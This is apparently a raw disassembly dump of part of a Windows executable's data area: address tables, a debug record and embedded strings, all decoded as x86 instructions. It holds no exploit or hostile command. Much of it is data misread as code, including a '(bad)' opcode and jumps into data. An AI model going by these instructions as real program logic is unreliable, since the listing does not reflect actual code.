  413c22:	sbb    BYTE PTR ds:0x3d1c0041,bh
  413c28:	inc    ecx
  413c29:	add    BYTE PTR [eax],ah
  413c2b:	cmp    eax,0x3d240041
  413c30:	inc    ecx
  413c31:	add    BYTE PTR [eax],ch
  413c33:	cmp    eax,0x3d2c0041
  413c38:	inc    ecx
  413c39:	add    BYTE PTR [eax],dh
  413c3b:	cmp    eax,0x3d340041
  413c40:	inc    ecx
	...
  413c51:	add    BYTE PTR [eax],al
  413c53:	add    BYTE PTR [esi+0x4df185],bh
  413c59:	add    BYTE PTR [eax],al
  413c5b:	add    BYTE PTR [edx],al
  413c5d:	add    BYTE PTR [eax],al
  413c5f:	add    BYTE PTR [eax+0x0],dl
  413c62:	add    BYTE PTR [eax],al
  413c64:	inc    eax
  413c65:	cmp    eax,0x31400001
  413c6a:	add    DWORD PTR [eax],eax
  413c6c:	scas   al,BYTE PTR es:[edi]
  413c6d:	inc    ebp
  413c6e:	adc    BYTE PTR [eax],al
  413c70:	inc    esp
  413c71:	cmp    edx,DWORD PTR [eax]
  413c73:	add    BYTE PTR [edi+0x4e],bl
  413c76:	adc    BYTE PTR [eax],al
  413c78:	push   0x4b
  413c7a:	adc    BYTE PTR [eax],al
  413c7c:	cmp    edx,DWORD PTR fs:[eax]
  413c7f:	add    BYTE PTR [eax+0x43001057],bl
  413c85:	sbb    dl,BYTE PTR [eax]
  413c87:	add    BYTE PTR [esi+0x39],bl
  413c8a:	adc    BYTE PTR [eax],al
  413c8c:	idiv   BYTE PTR [ebx]
  413c8e:	inc    ecx
  413c8f:	add    dl,bh
  413c91:	cmp    eax,DWORD PTR [ecx+0x0]
  413c94:	(bad)  
  413c95:	cmp    eax,DWORD PTR [ecx+0x0]
  413c98:	add    bh,BYTE PTR [ecx+eax*2]
  413c9b:	add    BYTE PTR [esi],al
  413c9d:	cmp    al,0x41
  413c9f:	add    BYTE PTR [edx],cl
  413ca1:	cmp    al,0x41
  413ca3:	add    BYTE PTR [esi],cl
  413ca5:	cmp    al,0x41
  413ca7:	add    BYTE PTR [edx],dl
  413ca9:	cmp    al,0x41
  413cab:	add    BYTE PTR [esi],dl
  413cad:	cmp    al,0x41
  413caf:	add    BYTE PTR [edx],bl
  413cb1:	cmp    al,0x41
  413cb3:	add    BYTE PTR [esi],bl
  413cb5:	cmp    al,0x41
  413cb7:	add    al,bl
  413cb9:	cmp    al,0x41
  413cbb:	add    ah,bl
  413cbd:	cmp    al,0x41
  413cbf:	add    al,ah
  413cc1:	cmp    al,0x41
  413cc3:	add    ah,ah
  413cc5:	cmp    al,0x41
  413cc7:	add    al,ch
  413cc9:	cmp    al,0x41
  413ccb:	add    ah,ch
  413ccd:	cmp    al,0x41
  413ccf:	add    al,dh
  413cd1:	cmp    al,0x41
  413cd3:	add    ah,dh
  413cd5:	cmp    al,0x41
  413cd7:	add    BYTE PTR [ebp+0x16],ah
  413cda:	adc    BYTE PTR [eax],al
  413cdc:	sub    BYTE PTR [ecx+0x10],0x0
  413ce0:	cli    
  413ce1:	adc    BYTE PTR [bx+si],al
  413ce4:	sbb    BYTE PTR [ecx],al
  413ce6:	adc    BYTE PTR [eax],al
  413ce8:	pop    edi
  413ce9:	inc    esp
  413cea:	adc    BYTE PTR [eax],al
  413cec:	sbb    BYTE PTR [edx],ch
  413cee:	adc    BYTE PTR [eax],al
  413cf0:	in     eax,dx
  413cf1:	pop    ss
  413cf2:	adc    BYTE PTR [eax],al
  413cf4:	pop    esp
  413cf5:	sub    BYTE PTR [eax],dl
  413cf7:	add    BYTE PTR [esp+edi*1+0x41],ch
  413cfb:	add    BYTE PTR [eax+0x3c],dh
  413cfe:	inc    ecx
  413cff:	add    BYTE PTR [esp+edi*1+0x41],dh
  413d03:	add    BYTE PTR [eax+0x3c],bh
  413d06:	inc    ecx
  413d07:	add    BYTE PTR [esp+edi*1+0x41],bh
  413d0b:	add    BYTE PTR [eax-0x7bffbec4],al
  413d11:	cmp    al,0x41
  413d13:	add    BYTE PTR [eax-0x17ffbec4],cl
  413d19:	aaa    
  413d1a:	adc    BYTE PTR [eax],al
  413d1c:	cmp    DWORD PTR [esi],0x51e90010
  413d22:	adc    BYTE PTR [eax],al
  413d24:	push   cs
  413d25:	dec    eax
  413d26:	adc    BYTE PTR [eax],al
  413d28:	mov    ah,0x22
  413d2a:	adc    BYTE PTR [eax],al
  413d2c:	lock xor BYTE PTR [eax],dl
  413d2f:	add    BYTE PTR [edi+0x6b],ah
  413d32:	adc    BYTE PTR [eax],al
  413d34:	outs   dx,BYTE PTR ds:[esi]
  413d35:	or     eax,0x10
  413d3a:	add    BYTE PTR [eax],al
  413d3c:	add    BYTE PTR [eax],al
  413d3e:	add    BYTE PTR [eax],al
  413d40:	push   edx
  413d41:	push   ebx
  413d42:	inc    esp
  413d43:	push   ebx
  413d44:	ss cs ret 0x2f1
  413d49:	jecxz  0x413cde
  413d4b:	inc    esp
  413d4c:	mov    edi,DWORD PTR [ecx+0x37b0725d]
  413d52:	aaa    
  413d53:	push   0x1
  413d58:	inc    ebp
  413d59:	cmp    bl,BYTE PTR [ecx+ecx*2+0x6e]
  413d5d:	jae    0x413dd3
  413d5f:	popa   
  413d60:	ins    BYTE PTR es:[edi],dx
  413d61:	ins    BYTE PTR es:[edi],dx
  413d62:	and    BYTE PTR [eax+0x61],dl
  413d65:	je     0x413dcf
  413d67:	pop    esp
  413d68:	push   ebx
  413d69:	outs   dx,BYTE PTR gs:[esi]
  413d6b:	fs push ebx
  413d6d:	dec    ebp
  413d6e:	push   ebx
  413d6f:	pop    esp
  413d70:	dec    ebp
  413d71:	popa   
  413d72:	imul   ebp,DWORD PTR [esi+0x5c],0x46627553
  413d79:	outs   dx,DWORD PTR ds:[esi]
  413d7a:	ins    BYTE PTR es:[edi],dx
  413d7b:	fs gs jb 0x413ddb
  413d7f:	dec    ecx
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413d85:	gs jae 0x413de4
  413d88:	dec    ecx
  413d89:	outs   dx,BYTE PTR ds:[esi]
  413d8a:	outs   dx,WORD PTR ds:[esi]
  413d8c:	inc    ecx
  413d8d:	jo     0x413dff
  413d8f:	add    BYTE PTR [eax],al
  413d91:	add    BYTE PTR [eax],al
  413d93:	add    BYTE PTR [esi+0x4df185],bh
  413d99:	add    BYTE PTR [eax],al
  413d9b:	add    dl,al
  413d9d:	cmp    eax,0x10001
  413da2:	add    BYTE PTR [eax],al
  413da4:	add    DWORD PTR [eax],eax
  413da6:	add    BYTE PTR [eax],al
  413da8:	add    DWORD PTR [eax],eax
  413daa:	add    BYTE PTR [eax],al
  413dac:	mov    eax,0xbc00013d
  413db1:	cmp    eax,0x3dc00001
  413db6:	add    DWORD PTR [eax],eax
  413db8:	mov    ds:0xce000026,al
  413dbd:	cmp    eax,0x1
  413dc2:	push   ebx
  413dc3:	jns    0x413e32
  413dc5:	bound  ebp,QWORD PTR [edi+0x6c]
  413dc8:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  413dcf:	inc    ebx
  413dd0:	ins    BYTE PTR es:[edi],dx
  413dd1:	outs   dx,DWORD PTR ds:[esi]
  413dd2:	jae    0x413e39
  413dd4:	push   edi
  413dd5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  413ddc:	popa   
  413ddd:	je     0x413e48
  413ddf:	outs   dx,DWORD PTR ds:[esi]
  413de0:	outs   dx,BYTE PTR ds:[esi]
  413de1:	inc    ebx
  413de2:	ins    BYTE PTR es:[edi],dx
  413de3:	outs   dx,DWORD PTR ds:[esi]
  413de4:	jae    0x413e4b
  413de6:	push   edi
  413de7:	.byte 0x69
